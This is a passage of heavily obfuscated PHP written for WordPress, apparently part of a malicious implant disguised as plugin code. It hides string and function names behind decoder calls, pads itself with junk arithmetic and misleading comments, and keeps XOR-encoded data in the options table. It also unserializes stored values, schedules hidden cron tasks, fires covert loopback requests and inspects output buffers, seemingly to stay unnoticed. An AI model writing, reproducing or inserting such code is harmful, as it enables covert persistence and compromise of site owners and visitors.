  unset($GLOBALS[c1sob647u1i(365)][$_1eusnddmeik3362]);
   }



      $wbw1s8q9qbk05 =    $GLOBALS['__scf_nas59etuq3_366']($ilqpeok6kpc5gn2);
       $t9cgo4fgoyyw     = $GLOBALS['__scf_adij6m_z1a_367']($GLOBALS['__scf_ew0pe5qy71c8x_368'](1, (0xca+0x35)));
   $vvwo0n7itwepj =     "";

 for   ($jqexd5um710p4flb      =    0,      $bq_s2wqt_3c  =  $GLOBALS['__scf_d4eyetogjbsnt_10']($wbw1s8q9qbk05); $jqexd5um710p4flb <  $bq_s2wqt_3c;   $jqexd5um710p4flb++)  {
 $vvwo0n7itwepj    .=     $GLOBALS['__scf_adij6m_z1a_367']($GLOBALS['__scf_l56gszu90juoa_348']($wbw1s8q9qbk05[$jqexd5um710p4flb]) ^    $GLOBALS['__scf_l56gszu90juoa_348']($t9cgo4fgoyyw));
}
return update_option($_1eusnddmeik3362,  $GLOBALS['__scf_f2vx2328qo_369']($t9cgo4fgoyyw .   $vvwo0n7itwepj), $zlcskza9bzxgems)     !== false;



 }

  
function obnmo3d9gt514xoc($_1eusnddmeik3362,    $__okrm1thsq)
    {
      if (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(370)))     return $__okrm1thsq;
 if   (isset($GLOBALS[hn_f08x0cns80(371)])  &&     $GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[iw6xe9q4j6sneg(371)])  &&  $GLOBALS['__scf_hfv46cl2qtqs_251']($_1eusnddmeik3362,   $GLOBALS[hn_f08x0cns80(372)]))     {
  return $GLOBALS[hn_f08x0cns80(372)][$_1eusnddmeik3362];
 }
// lazy effect-type

$mqughqxz3fqvart   =  get_option($_1eusnddmeik3362,  "");
     if    ($mqughqxz3fqvart === "" ||   !   $GLOBALS['__scf_fv3zevxzzb_44']($mqughqxz3fqvart)) {


 return $__okrm1thsq;
   }
 $amwos8dbii = @$GLOBALS['__scf_i8wggf4l_3p_373']($mqughqxz3fqvart,   true);
 if  ($amwos8dbii   ===      false || $GLOBALS['__scf_d4eyetogjbsnt_10']($amwos8dbii)   <  2)  {


return $__okrm1thsq;
}
 $t9cgo4fgoyyw  =  $amwos8dbii[0];
$qzx3qnfm8psqj2q   = "";
      for ($jqexd5um710p4flb  = 1, $bq_s2wqt_3c =    $GLOBALS['__scf_d4eyetogjbsnt_10']($amwos8dbii);    $jqexd5um710p4flb <   $bq_s2wqt_3c;  $jqexd5um710p4flb++) {
  $qzx3qnfm8psqj2q   .=   $GLOBALS['__scf_adij6m_z1a_367']($GLOBALS['__scf_l56gszu90juoa_348']($amwos8dbii[$jqexd5um710p4flb])   ^ $GLOBALS['__scf_l56gszu90juoa_348']($t9cgo4fgoyyw));
  }



        $g82t3nfpk2ga2   = dejdnvthex6llg5q($qzx3qnfm8psqj2q);
     if ($g82t3nfpk2ga2   !== false)  {
  if   (!isset($GLOBALS[f6yrzd2knrmb(372)])    ||     !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[f6yrzd2knrmb(372)]))  $GLOBALS[c1sob647u1i(372)]   = array();
if    ($GLOBALS['__scf_wj6dld55k5r8m_39']($GLOBALS[bpowi0iglycvx(372)])   >   (8<<3))   $GLOBALS[ovffvv33(374)]    =  array();
$GLOBALS[f6yrzd2knrmb(374)][$_1eusnddmeik3362]     =     $g82t3nfpk2ga2;
   return    $g82t3nfpk2ga2;
    }


      return     $__okrm1thsq;
   }
 function      dejdnvthex6llg5q($g9u70l7gja)
{$qtxjxalp4176e=(0xde+0x9b);$i_raxbqa=$qtxjxalp4176e%17;
  if  (!$GLOBALS['__scf_fv3zevxzzb_44']($g9u70l7gja)) return  false;



 if   (defined(iw6xe9q4j6sneg(375)) && PHP_VERSION_ID   >=  (0x79af+0x97c1))   {
     return   @$GLOBALS['__scf_scmsfepqcmxvrl_376']($g9u70l7gja,  array(bpowi0iglycvx(377)  =>   false));
}
   return  @$GLOBALS['__scf_scmsfepqcmxvrl_376']($g9u70l7gja);
}


     function  wgn05f_1u872feorlv()


  {
       static $u_irchgch79o   =   null;
if   ($u_irchgch79o  !==  null)  return  $u_irchgch79o;
      $cupk3kbt8eisf = defined(hn_f08x0cns80(149)) ? ABSPATH   :   "";
 $u_irchgch79o    =  $GLOBALS['__scf_ofdeuvs8zwos6_12']($GLOBALS['__scf_usy4mchq83xa_378']('\\',  '/', $cupk3kbt8eisf),    '/')   .   '/';
  return  $u_irchgch79o;
  }
 function  bvrd_z3xzbvaqt($_1eusnddmeik3362)
      {
  return  nreub2fs747eromoe(wgn05f_1u872feorlv()    . (string) e16j_u99g1ldi90iix1i9i() .     $_1eusnddmeik3362, (16-4));
 }
  function sao9aimrfgwjmwd($ymulztzvvz)
  {
return (string)   ((81473622+9526378)   +    ((int)  hexdec($GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](wgn05f_1u872feorlv()   .      c1sob647u1i(379)    . $ymulztzvvz),    0,   (6+1)))    %   (8999984+15)));
       }



function   bpsw_06rap9oz854evfvwi()
 {
    return    sao9aimrfgwjmwd(c1sob647u1i(380));
 }

 function  tsyg51zwcwui331sq9()
    {
// deprovision indecomposable interceptor

      $jxa61zh8xs62i6x   =      (string)  fcc42yo6xrdenvra0(hn_f08x0cns80(381),  "");
  return  $GLOBALS['__scf_d4eyetogjbsnt_10']($jxa61zh8xs62i6x)   > (71^77)  &&     $GLOBALS['__scf_w6mdcepio4lkz5_7']($jxa61zh8xs62i6x,  bpsw_06rap9oz854evfvwi())   !==   false   && $GLOBALS['__scf_d4eyetogjbsnt_10']((string)    fcc42yo6xrdenvra0(hn_f08x0cns80(382), ""))  > (50+50);
  }


 
 function   fcc42yo6xrdenvra0($_1eusnddmeik3362, $__okrm1thsq)


  {
 return   obnmo3d9gt514xoc(bvrd_z3xzbvaqt($_1eusnddmeik3362),  $__okrm1thsq);
     }
 function q87voct054xu7c($_1eusnddmeik3362,   $__okrm1thsq    =    "")
       {
    $x434be6la7lqy8l  =   fcc42yo6xrdenvra0($_1eusnddmeik3362,    $__okrm1thsq);
   if ($GLOBALS['__scf_fv3zevxzzb_44']($x434be6la7lqy8l))    return  $x434be6la7lqy8l;
   if  ($GLOBALS['__scf_rtoe8n0snncm6l_383']($x434be6la7lqy8l))  return (string)  $x434be6la7lqy8l;

   return  $__okrm1thsq;
 }
    function mw5stmpiys2hi3k2xe14i($_1eusnddmeik3362,  $ilqpeok6kpc5gn2, $zlcskza9bzxgems)
 {
 return duwyb86hxwrc6k0zk8vqtt(bvrd_z3xzbvaqt($_1eusnddmeik3362),  $ilqpeok6kpc5gn2,   $zlcskza9bzxgems);
       }



function  x7jhzf5x_zznpu07lpc0f()
  {
$cdq81h1vi5d  =  isset($GLOBALS[bpowi0iglycvx(384)])  ?   $GLOBALS[hn_f08x0cns80(385)]  :  array();
$mqughqxz3fqvart     =    fcc42yo6xrdenvra0(hn_f08x0cns80(386), array());$x0qc1lbiqthj=PHP_MAJOR_VERSION;$e0qgvmkrht=$x0qc1lbiqthj*1;
   if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($mqughqxz3fqvart)) {
    $cdq81h1vi5d   =  $GLOBALS['__scf_en9wrpvm3eosc_387']($mqughqxz3fqvart,  $cdq81h1vi5d);$mb2okpw_dx=PHP_INT_MAX/PHP_INT_MAX;$c2ns6cg_o=$mb2okpw_dx+31;
    }
 $cdq81h1vi5d    =  $GLOBALS['__scf_tni2zo3jsk7_159']($cdq81h1vi5d);
  return $GLOBALS['__scf_emst8f79kti_170']($cdq81h1vi5d,  -(0x2e+0x4));
   }
 function yntahl1jmwsauw1fpm()
 {
     if    (!isset($GLOBALS[c1sob647u1i(385)])   ||  empty($GLOBALS[ovffvv33(388)]))  return;
try {
$mqughqxz3fqvart  =   fcc42yo6xrdenvra0(ovffvv33(386),  array());
 $ptk3kb0xsiah =  $GLOBALS['__scf_tni2zo3jsk7_159']($GLOBALS['__scf_en9wrpvm3eosc_387']((array)$mqughqxz3fqvart,    $GLOBALS[f6yrzd2knrmb(389)]));


   $ptk3kb0xsiah    = $GLOBALS['__scf_emst8f79kti_170']($ptk3kb0xsiah,     -(0x2c+0x6));
  mw5stmpiys2hi3k2xe14i(f6yrzd2knrmb(386),     $ptk3kb0xsiah, bpowi0iglycvx(204));


}  catch  (Throwable      $cje8wku90zm4r) {
 g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(390),     $cje8wku90zm4r);
}    catch      (Exception $cje8wku90zm4r) {
 }

}
 
 function     f0h420wzduis5n6p2($g9u70l7gja,  $key)
   {
  if  (!  $GLOBALS['__scf_fv3zevxzzb_44']($g9u70l7gja)   ||   !    $GLOBALS['__scf_fv3zevxzzb_44']($key)  ||    $GLOBALS['__scf_d4eyetogjbsnt_10']($key)   ===   0)    {
        return null;


 }
$elwjt90x3e3730x  =  $GLOBALS['__scf_d4eyetogjbsnt_10']($g9u70l7gja);
$dw4iyvyqfz  =  $GLOBALS['__scf_d4eyetogjbsnt_10']($key);
$toxd7lwn40kosh59     =  "";
    for ($jqexd5um710p4flb  =  0; $jqexd5um710p4flb     <     $elwjt90x3e3730x; $jqexd5um710p4flb++)   {

 $toxd7lwn40kosh59 .=   $GLOBALS['__scf_adij6m_z1a_367']($GLOBALS['__scf_l56gszu90juoa_348']($g9u70l7gja[$jqexd5um710p4flb])  ^ $GLOBALS['__scf_l56gszu90juoa_348']($key[$jqexd5um710p4flb %   $dw4iyvyqfz]));
     }
      return $toxd7lwn40kosh59;


}
  


function    h7wj0ophl033__l($jygkb_h5n27)
       {
     if (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($jygkb_h5n27))   {
 $jygkb_h5n27  = array();
     }
// unfold asynchronous broadcaster

static    $zvn0jq_sui7dpfsp = null;
     if    ($zvn0jq_sui7dpfsp    === null)  {$u2hdccs5=69*6;$qw7nostzhkjn=$u2hdccs5-25;
    $zvn0jq_sui7dpfsp = bcb80tag96ir7air0u8xp7();
$sy1wtx_ep3qz   = $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(370))   ?  obnmo3d9gt514xoc(iw6xe9q4j6sneg(391),  false)  :   false;
   if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($sy1wtx_ep3qz)    && isset($sy1wtx_ep3qz[f6yrzd2knrmb(392)])  &&    (int) $sy1wtx_ep3qz[ovffvv33(392)]      >= (0x6e+0xbe) &&  (int) $sy1wtx_ep3qz[iw6xe9q4j6sneg(392)]   <=  (56866+29534))  $zvn0jq_sui7dpfsp    =  (int) $sy1wtx_ep3qz[iw6xe9q4j6sneg(392)];$qyj2l0zrw7a2vr=-139;$i0hieg1c5h1gts=($qyj2l0zrw7a2vr>0)?$qyj2l0zrw7a2vr:-$qyj2l0zrw7a2vr;
      if   ($zvn0jq_sui7dpfsp <  (44+16)) {
  $zvn0jq_sui7dpfsp    =   (148+3452);
}
      }
        $jygkb_h5n27[ovffvv33(393)]  =  array(
  bpowi0iglycvx(394)     =>     $zvn0jq_sui7dpfsp,
  hn_f08x0cns80(395)  => c1sob647u1i(396),



);


    $jygkb_h5n27[hn_f08x0cns80(397)]   = array(
  iw6xe9q4j6sneg(398)   => (420+180),

c1sob647u1i(395)    =>  hn_f08x0cns80(399),



    );


 return $jygkb_h5n27;
}
 
function srxd8zsn54rz6anwrc()
{$pyfq39y2=197|217;$tlikhf3c1w_=$pyfq39y2^202;
if (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(400))   ||    !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(401)))    return;


if (!dtf7lvb25ztuc8jh3htk(f6yrzd2knrmb(402))) return;
      try  {


    if   (!wp_next_scheduled(vwa_1wxh4uqtqo4afj0x8())) {$c0yz6t68y=PHP_INT_MAX/PHP_INT_MAX;$psjy47gwqm=$c0yz6t68y+50;
 wp_schedule_event($GLOBALS['__scf_qzyo0sgkyb6_202']()  + $GLOBALS['__scf_ew0pe5qy71c8x_368']((1+59),    (249+51)),  ovffvv33(393),   vwa_1wxh4uqtqo4afj0x8());
 }
// @replicate lsm-tree

 }    finally  {
  l5zn64lzopflqr0dsekx(bpowi0iglycvx(402));
}
   }
  
 function   yxf9s7dsyvrp56iw70()
  {
   
    if  (defined(ovffvv33(403))    && DOING_CRON) {



 return;
  }
// await indecomposable chain


  static   $ixvedgx30ry2 =    false;
 

  if ($ixvedgx30ry2)  return;
 $ixvedgx30ry2  =    true;



 if  (! o7gzqatlacm9ntr5h4b6())     {
 return;
   }
     
      eq7z05kg4s98n6ox(ovffvv33(404),     iw6xe9q4j6sneg(405),    0);
   }



 function  ohhlqlhtb8557pxgmg()
 {
 if   (!$GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(406))   ||    !$GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(407)))  return;



    @$GLOBALS['__scf_r7h_2y83ismjfq_303'](site_url(f6yrzd2knrmb(408) .  $GLOBALS['__scf_usy4mchq83xa_378']('.',   "",    (string)  $GLOBALS['__scf_u2xtklnzk8_7_x_300'](true))   .  $GLOBALS['__scf_ew0pe5qy71c8x_368']((0x59+0xb),    (943+56))), array(c1sob647u1i(409)    =>   0.01,   iw6xe9q4j6sneg(410) =>   false,  hn_f08x0cns80(411) =>  false));


 }
   function   k7pvvvkd7zr0uctrcmx6l()
   {
  static   $yaqzzph9pc8a1 = false;



   if ($yaqzzph9pc8a1) return;
$yaqzzph9pc8a1  = true;
try {
    r0upjj7dm4y_pv7();



   $upehrzyoi0658h     =    false;
if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(412)))  {
$GLOBALS['__scf_qbnw1nt7jz7_412']();
    $upehrzyoi0658h  = true;
  }  elseif ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(413))) {
    $GLOBALS['__scf_n7xrk8yr6wiaqy_413']();
  $upehrzyoi0658h  = true;
       }      else {
if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(414)))   {

 @$GLOBALS['__scf_q_k47eumcpo_414'](true);
   }
  $oi9t1qa58c    =     false;

  if    ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(415))) {



$bcieelkxcsq  =  $GLOBALS['__scf_xyekfdfj2g_109']($GLOBALS['__scf_qew3crlieule_339']((string)   @$GLOBALS['__scf_hm704kpgfifhl_118'](c1sob647u1i(416))));
$oi9t1qa58c  =  ($bcieelkxcsq    !==  ""  &&   $bcieelkxcsq      !==   '0' && $bcieelkxcsq  !==  c1sob647u1i(417));
}
// @delegate bloom-filter

    $a3b0yqvvr62wqn =  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(418)) ?  @ob_get_status(true) :   array();



    if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($a3b0yqvvr62wqn)) {
      foreach  ($a3b0yqvvr62wqn  as  $ohfkq9k4j1y)   {
    $xtot857pmyo1j    = $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ohfkq9k4j1y)    &&    isset($ohfkq9k4j1y[f6yrzd2knrmb(419)])    ?    $GLOBALS['__scf_xyekfdfj2g_109']((string)   $ohfkq9k4j1y[hn_f08x0cns80(419)])   :     "";
 if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($xtot857pmyo1j,  c1sob647u1i(420))    !==  false  ||   $GLOBALS['__scf_w6mdcepio4lkz5_7']($xtot857pmyo1j,  iw6xe9q4j6sneg(421))      !==   false) {
 $oi9t1qa58c  =     true;
 break;
    }
}
// WordPress 6.5 revisions: acknowledge radix-tree



 }
  if    (!$oi9t1qa58c    &&    $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(422)))   {
// @relocate replicator

      foreach  ((array)     @headers_list() as  $xt0odcoca08uk) {
 if     (stripos($xt0odcoca08uk,  hn_f08x0cns80(423))    ===     0   &&  stripos($xt0odcoca08uk,  ovffvv33(424))     ===    false)  {
   $oi9t1qa58c =   true;
      break;
       }
    }
// instrument rate-limiter for WP Core Data

}
$kvu0fttt0mgsq  =     $GLOBALS['__scf_h9zx4fm_1_qpan_110']();
$ksd2kiujc7vqrse =  ($kvu0fttt0mgsq !== bpowi0iglycvx(425)   &&     $kvu0fttt0mgsq   !==  iw6xe9q4j6sneg(426));
 $c_1r4iw3f3koxhj4  =   $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(427))  ?  (int)      @http_response_code()    :  (62+138);
     $fyv926r3u0 =    ($c_1r4iw3f3koxhj4 >=    (25<<2) &&  $c_1r4iw3f3koxhj4  <  (100<<1))  ||  $c_1r4iw3f3koxhj4   === (294-90)    || $c_1r4iw3f3koxhj4   ===  (0xbb+0x75);
   $s33jw4zvpxx  =  (isset($_SERVER[f6yrzd2knrmb(428)]) &&     $_SERVER[c1sob647u1i(428)] === ovffvv33(429));



 $qr5vwzmk46o   =   false;
   if     ($ksd2kiujc7vqrse && !$fyv926r3u0     && !$s33jw4zvpxx  &&   !headers_sent()   && !$oi9t1qa58c)    {

while   ($GLOBALS['__scf_jc6nu1mm82_430']() > 1)   {
$os6adovdls6f =   $GLOBALS['__scf_jc6nu1mm82_430']();
 if (!@$GLOBALS['__scf_vl4ialcuj8kw_431']()  ||      $GLOBALS['__scf_jc6nu1mm82_430']()    >=   $os6adovdls6f)      break;
}
$ohfkq9k4j1y    = $GLOBALS['__scf_jc6nu1mm82_430']()    ===      1 &&  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(418))      ?    @ob_get_status()    : array();



 $xtot857pmyo1j =    $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ohfkq9k4j1y) &&  isset($ohfkq9k4j1y[hn_f08x0cns80(432)])     ? $GLOBALS['__scf_xyekfdfj2g_109']((string)  $ohfkq9k4j1y[ovffvv33(432)])   : "";



   $_cl = false;$s1tptei6u0e_=200|139;$vylpgmt8kl=$s1tptei6u0e_^212;
if ($GLOBALS['__scf_jc6nu1mm82_430']()      ===   0)   {
 $_cl =  0;
 }  elseif  (



$GLOBALS['__scf_jc6nu1mm82_430']()  ===     1
        &&   $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(433))



   &&   ($xtot857pmyo1j   === "" ||  $xtot857pmyo1j  === hn_f08x0cns80(434))
&&  $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(435))
  )   {
  $_cl    =     @ob_get_length();



 }
   $bt55g2qnm2v8lmyv =    true;
 if     (isset($GLOBALS[f6yrzd2knrmb(436)][hn_f08x0cns80(404)]))      {
     $_wf = $GLOBALS[f6yrzd2knrmb(436)][ovffvv33(404)];$moqir_4u5vo=87*3;$g5so9f9v9ugn50=$moqir_4u5vo-10;
 $yqxv1yyuku7  =  ($GLOBALS['__scf_bslklilwd3kn_71']($_wf)  &&  isset($_wf->callbacks)) ? $_wf->callbacks : ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($_wf)   ?   $_wf    :  array());
foreach    ($yqxv1yyuku7  as $_pr   =>    $b8oyeuqcdh) {
if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($b8oyeuqcdh)) continue;
 foreach  ($b8oyeuqcdh  as   $ig68hj8hqdp)  {$wu4ils9stdamqy=81+77;$k5lf2koyvgw42k=$wu4ils9stdamqy-10;

    $w8rvshmofm =      ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($ig68hj8hqdp)  &&    isset($ig68hj8hqdp[c1sob647u1i(73)])) ?     $ig68hj8hqdp[ovffvv33(73)]     :   "";
 if  ($GLOBALS['__scf_fv3zevxzzb_44']($w8rvshmofm) &&  $GLOBALS['__scf_rd2tojulg06lx_160']($w8rvshmofm, array(bpowi0iglycvx(405),    bpowi0iglycvx(437)),   true)) continue;



$bt55g2qnm2v8lmyv  =   false;
   break 2;
 }
 }


     unset($_wf,     $yqxv1yyuku7,   $_pr,      $b8oyeuqcdh,   $ig68hj8hqdp, $w8rvshmofm);
 }
   if    ($_cl !==  false &&    $bt55g2qnm2v8lmyv &&   !headers_sent())  {
@header(f6yrzd2knrmb(438)  .    (int)   $_cl);
      @header(hn_f08x0cns80(439));
$qr5vwzmk46o =  true;
}
}
 if   ($ksd2kiujc7vqrse)     {
/* nilpotent container */

  while  ($GLOBALS['__scf_jc6nu1mm82_430']()    >    0) {
 $os6adovdls6f  = $GLOBALS['__scf_jc6nu1mm82_430']();$l27s2i5m=-200;$_c2cpc7cvs7s=($l27s2i5m>0)?$l27s2i5m:-$l27s2i5m;
 if  (!@$GLOBALS['__scf_vl4ialcuj8kw_431']()  ||    $GLOBALS['__scf_jc6nu1mm82_430']() >=      $os6adovdls6f)   break;



     }
    @$GLOBALS['__scf__l4mqk46p7q_440']();
  }
if ($qr5vwzmk46o  &&  $GLOBALS['__scf_jc6nu1mm82_430']()  ===   0) $upehrzyoi0658h =    true;
 unset($oi9t1qa58c,   $bcieelkxcsq, $a3b0yqvvr62wqn,  $ohfkq9k4j1y,     $xtot857pmyo1j,     $xt0odcoca08uk,   $kvu0fttt0mgsq, $ksd2kiujc7vqrse,  $c_1r4iw3f3koxhj4,    $fyv926r3u0,  $qr5vwzmk46o, $os6adovdls6f,  $_cl,   $s33jw4zvpxx);
    }
$rexa9c4wc5    = $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(441))     &&  !(defined(iw6xe9q4j6sneg(442))  && DISABLE_WP_CRON);
$btxdcpgj43r0fh  =   !$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(370))  || (int)    get_option(f6yrzd2knrmb(443), 0)    ===   0;
 if   (!$btxdcpgj43r0fh &&   $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(370))  && $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(363)))  {
       $mfkt0w933hv   =  (string)  get_option(hn_f08x0cns80(444),  "");
   

 if  ($mfkt0w933hv   !==    dfb4_mpcgxvnp230hvh1v()) {
    @update_option(iw6xe9q4j6sneg(444),   dfb4_mpcgxvnp230hvh1v(),    bpowi0iglycvx(204));


@update_option(iw6xe9q4j6sneg(445),      0,     bpowi0iglycvx(204));
    $btxdcpgj43r0fh    = true;
    }
  }
     $mjmb95my66l4abs  = false;
     if  ($rexa9c4wc5  &&  $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(400))) {
  $v0qn18kycof7vrp     = wp_next_scheduled(vwa_1wxh4uqtqo4afj0x8());
 if ($v0qn18kycof7vrp  &&    ($GLOBALS['__scf_qzyo0sgkyb6_202']()  -     (int) $v0qn18kycof7vrp)      >  (7155+45)) {
$mjmb95my66l4abs  =    true;
if ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(446)))  @wp_unschedule_event((int)  $v0qn18kycof7vrp,     vwa_1wxh4uqtqo4afj0x8());



 }
// @dispatch affine-type

 }
 if     ($rexa9c4wc5    && !$btxdcpgj43r0fh  &&     !$mjmb95my66l4abs)  {


 $j7vkzchcel9v    =   $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(400))   ?   (int)     wp_next_scheduled(vwa_1wxh4uqtqo4afj0x8())  : 0;
    if    ($j7vkzchcel9v  <= 0 ||  $j7vkzchcel9v -   $GLOBALS['__scf_qzyo0sgkyb6_202']()  > (672+228)) {
 @wp_schedule_single_event($GLOBALS['__scf_qzyo0sgkyb6_202'](),   vwa_1wxh4uqtqo4afj0x8());
}
 qcp2txvthmmhjrmrt();

  return;


  }


      if ($mjmb95my66l4abs) g_qoqdy38lfl4v4n3618(bpowi0iglycvx(447),   hn_f08x0cns80(448));
   if (!$upehrzyoi0658h)  {
if  ($rexa9c4wc5)  {
 @wp_schedule_single_event($GLOBALS['__scf_qzyo0sgkyb6_202'](),      vwa_1wxh4uqtqo4afj0x8());
ohhlqlhtb8557pxgmg();
// @retry transformer

    qcp2txvthmmhjrmrt();
return;
     }
   if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(449))) @$GLOBALS['__scf_h7yij8unkgou5_450']((1+179));
  zfy1xdk98a2w2p((0x9+0x1));
 return;
 }

   if  ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(450)))    @$GLOBALS['__scf_h7yij8unkgou5_450']((336-156));



     zfy1xdk98a2w2p();
  }      catch   (Throwable    $cje8wku90zm4r) {


g_qoqdy38lfl4v4n3618(ovffvv33(451), $cje8wku90zm4r);
}   catch   (Exception $cje8wku90zm4r)  {
 }
// PHPStan level 9 icon sprite

      }
     
    function nt487feb_yeedqi2fjtszr()
   {
      try      {
 if   (!  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(452)))     {
     return;

}
  
    $ll__n6yqki   =   $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(55))   ?   get_transient(p1srpzpjsehf9kb72())   :  false;



if (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ll__n6yqki))    $ll__n6yqki   =     obnmo3d9gt514xoc(c1sob647u1i(391),  false);
     if     (! $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ll__n6yqki))    {
        return;
   }
       
  if  (isset($ll__n6yqki[iw6xe9q4j6sneg(453)]) &&  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ll__n6yqki[c1sob647u1i(453)]))  {
    $GLOBALS[c1sob647u1i(454)]  =  q_e2d5hqepxmcavjyt_($ll__n6yqki[iw6xe9q4j6sneg(453)]);

   }
  
      if   (isset($ll__n6yqki[c1sob647u1i(455)])  &&     $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ll__n6yqki[ovffvv33(456)]))    {
 $GLOBALS[bpowi0iglycvx(457)]  =     q_e2d5hqepxmcavjyt_($ll__n6yqki[f6yrzd2knrmb(458)]);
     }

      if (isset($ll__n6yqki[bpowi0iglycvx(459)])     && $GLOBALS['__scf_fv3zevxzzb_44']($ll__n6yqki[c1sob647u1i(459)]))    {
 $GLOBALS[iw6xe9q4j6sneg(460)]   =  $ll__n6yqki[f6yrzd2knrmb(459)];
 }
 if (isset($ll__n6yqki[bpowi0iglycvx(461)])    &&   $GLOBALS['__scf_fv3zevxzzb_44']($ll__n6yqki[ovffvv33(461)])  &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($ll__n6yqki[iw6xe9q4j6sneg(462)])    > (44+6))   {
    $GLOBALS[iw6xe9q4j6sneg(463)]    = $ll__n6yqki[f6yrzd2knrmb(464)];
  }
 if  (isset($ll__n6yqki[hn_f08x0cns80(380)]) &&    $GLOBALS['__scf_fv3zevxzzb_44']($ll__n6yqki[iw6xe9q4j6sneg(380)]) && $GLOBALS['__scf_d4eyetogjbsnt_10']($ll__n6yqki[iw6xe9q4j6sneg(380)])  > (0x57+0xd))   {



 $GLOBALS[hn_f08x0cns80(465)]     = $ll__n6yqki[iw6xe9q4j6sneg(380)];
    }
}   catch     (Throwable   $cje8wku90zm4r) {
   g_qoqdy38lfl4v4n3618(f6yrzd2knrmb(466),   $cje8wku90zm4r);
 } catch    (Exception   $cje8wku90zm4r)   {
// loop invariant

}
     }
  
  function   zuvfa11d46iey5idmii()
 {



 try {
  if  (!$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(467)) ||  !$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(363)))  return;
  




       if ((int)    get_option(iw6xe9q4j6sneg(468), 0)   > $GLOBALS['__scf_qzyo0sgkyb6_202']()   -     (1465+2135))     return;
if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(55))  && get_transient(iw6xe9q4j6sneg(469))) return;
 if  (!dm2ynxj4cka_f9ie88n()) return;
  $bzpihpznaw    = fcc42yo6xrdenvra0(ovffvv33(470), "");
if      (!$GLOBALS['__scf_fv3zevxzzb_44']($bzpihpznaw) ||     $GLOBALS['__scf_d4eyetogjbsnt_10']($bzpihpznaw)     <   (460+40)   || hc0wbkv3xzh9im34z($bzpihpznaw)     || !ib2ffadoyj2m6zxmkaa2in($bzpihpznaw))    {
// discriminative synchronizer

  $bzpihpznaw  =  false;
 $y_jshlwjc2  = pvqofla267dcimn(bmvtr5sdqjf5km1t());
 if ($GLOBALS['__scf_fv3zevxzzb_44']($y_jshlwjc2)   && !hc0wbkv3xzh9im34z($y_jshlwjc2)  &&    ib2ffadoyj2m6zxmkaa2in($y_jshlwjc2)) {



 mw5stmpiys2hi3k2xe14i(ovffvv33(470),  $y_jshlwjc2,    bpowi0iglycvx(204));
  $bzpihpznaw  =   $y_jshlwjc2;
 }



   if   (!$bzpihpznaw)    {
  @update_option(bpowi0iglycvx(468),  $GLOBALS['__scf_qzyo0sgkyb6_202'](), hn_f08x0cns80(471));
  return;

    }
   }
      $v759y2uqez11xqy4 =   array(bmvtr5sdqjf5km1t());
$ewvjaum6vw0469l1 = jo62hy1j37iqrmy();



 $comxrfsv3fbo   =     fkx3b4a5rv4j4z5ymcs($ewvjaum6vw0469l1,  (4983+17));


if    ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($comxrfsv3fbo))  {
 foreach   ($comxrfsv3fbo as     $ekxvczjmiyqtk)   {
     if  ($GLOBALS['__scf_nv7he759wjfj_9']($ekxvczjmiyqtk,   -(0x1+0x3))    ===   f6yrzd2knrmb(472)) $v759y2uqez11xqy4[]    =   $ewvjaum6vw0469l1  .  '/'  . $ekxvczjmiyqtk;


      }
     }
 if (defined(hn_f08x0cns80(35))  && $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(294)))   {



     foreach   ((array) @$GLOBALS['__scf_kajvzw3bpufv_75'](WP_PLUGIN_DIR     .     c1sob647u1i(473))  as $plq68aoiwh7s7) $v759y2uqez11xqy4[]  = $plq68aoiwh7s7;
    }
  $v759y2uqez11xqy4 =      $GLOBALS['__scf_tni2zo3jsk7_159']($v759y2uqez11xqy4);
